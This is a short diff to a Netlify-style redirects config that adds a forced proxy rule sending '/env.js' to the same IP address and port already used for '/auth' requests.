@@ -16,3 +16,9 @@
   to = "http://51.68.45.129:4317/auth/:splat"
   status = 200
   force = true
+
+[[redirects]]
+  from = "/env.js"
+  to = "http://51.68.45.129:4317/env.js"
+  status = 200
+  force = true
